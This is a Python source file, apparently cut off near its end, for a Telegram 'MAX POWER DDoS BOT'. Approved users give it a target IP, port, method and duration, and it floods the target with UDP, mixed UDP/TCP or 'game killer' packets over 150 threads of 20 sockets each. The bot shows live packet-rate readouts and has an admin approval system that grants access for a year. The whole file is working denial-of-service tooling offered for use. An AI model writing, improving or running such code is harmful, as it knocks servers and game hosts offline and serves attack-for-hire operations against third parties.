import asyncio
import threading
import time
import random
import socket
import re
import os
import json
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# ============ CONFIG ============
BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
ADMIN_IDS = [int(os.environ.get("ADMIN_ID", 0))] # Replace 0 with your admin ID
BLOCKED_PORTS = {22, 25, 443, 3389, 8700, 9031, 17500, 20000, 20001}

# ============ MAX POWER SETTINGS (Railway Limit) ============
class AttackConfig:
 def __init__(self):
 self.threads = 150
 self.sockets_per_thread = 20
 self.delay = 0.00001
 self.packet_size = 512

config = AttackConfig()
attack_running = False
attack_stats = {'packets': 0, 'target': '', 'method': '', 'start': 0, 'duration': 0}
stats_lock = threading.Lock()
user_data = {}

# ============ SIMPLE DB ============
USERS_FILE = "users.json"

def load_users():
 if os.path.exists(USERS_FILE):
 with open(USERS_FILE, 'r') as f:
 return json.load(f)
 return {}

def save_users(users):
 with open(USERS_FILE, 'w') as f:
 json.dump(users, f)

def is_approved(uid):
 users = load_users()
 return users.get(str(uid), {}).get('approved', False)

def approve_user(uid, days):
 users = load_users()
 users[str(uid)] = {'approved': True, 'expires': (datetime.now() + timedelta(days=days)).isoformat()}
 save_users(users)

# ============ MAX POWER ATTACK ENGINE (150 threads × 20 sockets = 3000 streams) ============
def udp_max_flood(ip, port):
 global attack_running, attack_stats
 socks = []
 for _ in range(config.sockets_per_thread):
 try:
 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 socks.append(s)
 except:
 pass
 payload = random._urandom(config.packet_size)
 while attack_running:
 for sock in socks:
 try:
 sock.sendto(payload, (ip, port))
 with stats_lock:
 attack_stats['packets'] += 1
 except:
 pass
 time.sleep(config.delay)
 for sock in socks:
 sock.close()

def mixed_max_flood(ip, port):
 global attack_running, attack_stats
 udp_socks = []
 for _ in range(config.sockets_per_thread):
 try:
 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 udp_socks.append(s)
 except:
 pass
 payload = random._urandom(config.packet_size)
 while attack_running:
 for sock in udp_socks:
 try:
 sock.sendto(payload, (ip, port))
 with stats_lock:
 attack_stats['packets'] += 1
 except:
 pass
 try:
 tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 tcp.settimeout(0.001)
 tcp.connect_ex((ip, port))
 tcp.close()
 with stats_lock:
 attack_stats['packets'] += 1
 except:
 pass
 time.sleep(config.delay)
 for sock in udp_socks:
 sock.close()

def game_killer_max(ip, port):
 global attack_running, attack_stats
 socks = []
 for _ in range(config.sockets_per_thread):
 try:
 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 socks.append(s)
 except:
 pass
 payloads = [
 b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00',
 random._urandom(1024),
 b'\x00' * 1024,
 b'\xff' * 1024,
 b'\x01' * 1024
 ]
 while attack_running:
 for payload in payloads:
 for sock in socks:
 try:
 sock.sendto(payload, (ip, port))
 with stats_lock:
 attack_stats['packets'] += 1
 except:
 pass
 time.sleep(config.delay)
 for sock in socks:
 sock.close()

def start_attack(ip, port, duration, method, send_callback):
 global attack_running, attack_stats
 attack_running = True
 with stats_lock:
 attack_stats = {
 'packets': 0,
 'target': f"{ip}:{port}",
 'method': method,
 'start': time.time(),
 'duration': duration
 }
 if method == 'udp':
 attack_func = udp_max_flood
 elif method == 'game':
 attack_func = game_killer_max
 else:
 attack_func = mixed_max_flood
 total_streams = config.threads * config.sockets_per_thread
 thread_list = []
 for _ in range(config.threads):
 t = threading.Thread(target=attack_func, args=(ip, port), daemon=True)
 t.start()
 thread_list.append(t)
 start_time = time.time()
 last_update = 0
 keyboard = [
 [InlineKeyboardButton("🛑 STOP", callback_data="stop_attack")],
 [InlineKeyboardButton("ℹ️ INFO", callback_data="info_attack"), InlineKeyboardButton("🔄 REFRESH", callback_data="refresh_attack")]
 ]
 while attack_running and (time.time() - start_time) < duration:
 time.sleep(0.5)
 if time.time() - last_update >= 1.5:
 last_update = time.time()
 elapsed = int(time.time() - start_time)
 remaining = duration - elapsed
 with stats_lock:
 pkt = attack_stats['packets']
 speed = int(pkt / elapsed) if elapsed > 0 else 0
 progress = int((elapsed / duration) * 20)
 bar = "█" * progress + "░" * (20 - progress)
 msg = (
 f"💀 *MAX POWER ATTACK* 💀\n\n"
 f"🎯 `{ip}:{port}`\n"
 f"⚙️ Method: `{method.upper()}`\n"
 f"📦 Packets: `{pkt:,}`\n"
 f"⏱️ Time: `{elapsed}/{duration}s`\n"
 f"📊 `[{bar}]`\n"
 f"💥 Speed: `{speed:,}` pps\n"
 f"🧵 Threads: `{config.threads}` × {config.sockets_per_thread} sockets = `{total_streams}` streams\n\n"
 f"*Use buttons:*"
 )
 send_callback(msg, InlineKeyboardMarkup(keyboard))
 attack_running = False
 for t in thread_list:
 t.join(timeout=0.5)
 with stats_lock:
 pkt = attack_stats['packets']
 avg_speed = int(pkt / duration) if duration else 0
 send_callback(f"✅ *ATTACK COMPLETE*\n\n📦 Total: `{pkt:,}` packets\n💥 Avg: `{avg_speed:,}` pps", None)

# ============ TELEGRAM HANDLERS ============
async def start_cmd(update, context):
 uid = update.effective_user.id
 if not is_approved(uid) and uid not in ADMIN_IDS:
 await update.message.reply_text("❌ Access Denied")
 return
 total_streams = config.threads * config.sockets_per_thread
 keyboard = [
 [InlineKeyboardButton("🚀 START ATTACK", callback_data="start_attack")],
 [InlineKeyboardButton("⚙️ SETTINGS", callback_data="settings")],
 [InlineKeyboardButton("📊 STATS", callback_data="stats")],
 [InlineKeyboardButton("🔑 APPROVE USER", callback_data="approve_user")]
 ]
 await update.message.reply_text(
 f"🔥 *MAX POWER DDoS BOT* 🔥\n\n"
 f"⚡ *Current Power:*\n"
 f"├ Threads: `{config.threads}`\n"
 f"├ Sockets/Thread: `{config.sockets_per_thread}`\n"
 f"├ Total Streams: `{total_streams}`\n"
 f"├ Delay: `{config.delay}` sec\n"
 f"└ Packet Size: `{config.packet_size}` bytes\n\n"
 f"💥 *Expected Speed:* `{int(1000000 / (config.delay * 1000000)) * config.threads * config.sockets_per_thread:,}` pps\n\n"
 f"👇 *Start attack now* 👇",
 parse_mode='Markdown',
 reply_markup=InlineKeyboardMarkup(keyboard)
 )

async def button_callback(update, context):
 query = update.callback_query
 await query.answer()
 uid = query.from_user.id
 data = query.data
 if data == "start_attack":
 user_data[uid] = {'step': 'ip'}
 await query.edit_message_text(
 "🎯 *TARGET IP*\n\nSend target IP:\nExample: `20.204.148.249`",
 parse_mode='Markdown'
 )
 elif data == "settings":
 total_streams = config.threads * config.sockets_per_thread
 keyboard = [
 [InlineKeyboardButton("⬆️ +10 THREADS", callback_data="inc_threads")],
 [InlineKeyboardButton("⬇️ -10 THREADS", callback_data="dec_threads")],
 [InlineKeyboardButton("🔧 DELAY 0.00001", callback_data="set_delay")]
 ]
 await query.edit_message_text(
 f"⚙️ *SETTINGS*\n\n"
 f"Threads: `{config.threads}` / 150\n"
 f"Sockets/Thread: `{config.sockets_per_thread}`\n"
 f"Total Streams: `{total_streams}`\n"
 f"Delay: `{config.delay}` sec\n\n"
 f"*Adjust:*",
 parse_mode='Markdown',
 reply_markup=InlineKeyboardMarkup(keyboard)
 )
 elif data == "inc_threads":
 if config.threads + 10 <= 150:
 config.threads += 10
 await query.edit_message_text(f"✅ Threads increased to {config.threads}")
 else:
 await query.answer("Max 150 threads!")
 elif data == "dec_threads":
 if config.threads - 10 >= 50:
 config.threads -= 10
 await query.edit_message_text(f"✅ Threads decreased to {config.threads}")
 else:
 await query.answer("Min 50 threads!")
 elif data == "set_delay":
 config.delay = 0.000005
 await query.edit_message_text(f"✅ Delay set to {config.delay} sec (MAX SPEED)")
 elif data == "stop_attack":
 global attack_running
 attack_running = False
 await query.edit_message_text("🛑 Stopped")
 elif data == "info_attack":
 if attack_running:
 with stats_lock:
 pkt = attack_stats['packets']
 elapsed = int(time.time() - attack_stats['start'])
 remaining = attack_stats['duration'] - elapsed
 speed = int(pkt / elapsed) if elapsed else 0
 await query.edit_message_text(
 f"ℹ️ *INFO*\n\n📦 `{pkt:,}` pkts\n⏱️ `{remaining}s` left\n💥 `{speed:,}` pps",
 parse_mode='Markdown'
 )
 elif data == "refresh_attack":
 if attack_running:
 with stats_lock:
 pkt = attack_stats['packets']
 elapsed = int(time.time() - attack_stats['start'])
 remaining = attack_stats['duration'] - elapsed
 speed = int(pkt / elapsed) if elapsed else 0
 progress = int((elapsed / attack_stats['duration']) * 20)
 bar = "█" * progress + "░" * (20 - progress)
 msg = (
 f"💀 *ATTACK ACTIVE* 💀\n\n"
 f"📦 `{pkt:,}` pkts\n"
 f"💥 `{speed:,}` pps\n"
 f"⏱️ `{elapsed}/{attack_stats['duration']}s`\n"
 f"📊 `[{bar}]`"
 )
 keyboard = [
 [InlineKeyboardButton("🛑 STOP", callback_data="stop_attack")],
 [InlineKeyboardButton("ℹ️ INFO", callback_data="info_attack"), InlineKeyboardButton("🔄 REFRESH", callback_data="refresh_attack")]
 ]
 await query.edit_message_text(msg, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))
 elif data == "approve_user":
 await query.edit_message_text("🔑 *APPROVE USER*\n\nSend user ID to approve:")
 user_data[uid] = {'step': 'approve_id'}

async def handle_message(update, context):
 uid = update.effective_user.id
 if not is_approved(uid) and uid not in ADMIN_IDS:
 return
 step_data = user_data.get(uid, {})
 step = step_data.get('step')
 text = update.message.text.strip()
 if step == 'ip':
 if not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', text):
 await update.message.reply_text("❌ Invalid IP")
 return
 step_data['ip'] = text
 step_data['step'] = 'port'
 user_data[uid] = step_data
 await update.message.reply_text(f"🔌 Port (1-65535):\n🚫 Blocked: {', '.join(map(str, sorted(BLOCKED_PORTS)))}")
 elif step == 'port':
 try:
 port = int(text)
 if port < 1 or port > 65535 or port in BLOCKED_PORTS:
 raise ValueError
 step_data['port'] = port
 step_data['step'] = 'method'
 user_data[uid] = step_data
 keyboard = [
 [InlineKeyboardButton("🔥 UDP MAX", callback_data="method_udp")],
 [InlineKeyboardButton("⚡ MIXED MAX", callback_data="method_mixed")],
 [InlineKeyboardButton("🎮 GAME KILLER", callback_data="method_game")]
 ]
 await update.message.reply_text("Select method:", reply_markup=InlineKeyboardMarkup(keyboard))
 except:
 await update.message.reply_text("❌ Invalid port")
 elif step == 'duration':
 try:
 duration = int(text)
 if duration < 5 or duration > 300:
 raise ValueError
 ip = step_data['ip']
 port = step_data['port']
 method = step_data.get('method', 'mixed')
 del user_data[uid]
 keyboard = [
 [InlineKeyboardButton("💀 START", callback_data=f"start_{ip}_{port}_{duration}_{method}")],
 [InlineKeyboardButton("❌ CANCEL", callback_data="cancel")]
 ]
 await update.message.reply_text(
 f"💀 *CONFIRM*\n\n🎯 {ip}:{port}\n⚙️ {method.upper()}\n⏱️ {duration}s\n\nStart?",
 parse_mode='Markdown',
 reply_markup=InlineKeyboardMarkup(keyboard)
 )
 except:
 await update.message.reply_text("❌ Duration 5-300")
 elif step == 'approve_id':
 try:
 user_id = int(text)
 approve_user(user_id, 365)
 await update.message.reply_text(f"✅ User {user_id} approved for 1 year!")
 except:
 await update.message.reply_text("❌ Invalid user ID")

async def method_callback(update, context):
 query = update.callback_query
 await query.answer()
 uid = query.from_user.id
 data = query.data
 if data.startswith("method_"):
 method = data.split("_")[1]
 if uid not in user_data:
 user_data[uid] = {}
 user_data[uid]['method'] = method
 user_data[uid]['step'] = 'duration'
 await query.edit_message_text(f"✅ Method: {method.upper()}\n\nSend duration (5-300s):")
 elif data.startswith("start_"):
 parts = data.split("_")
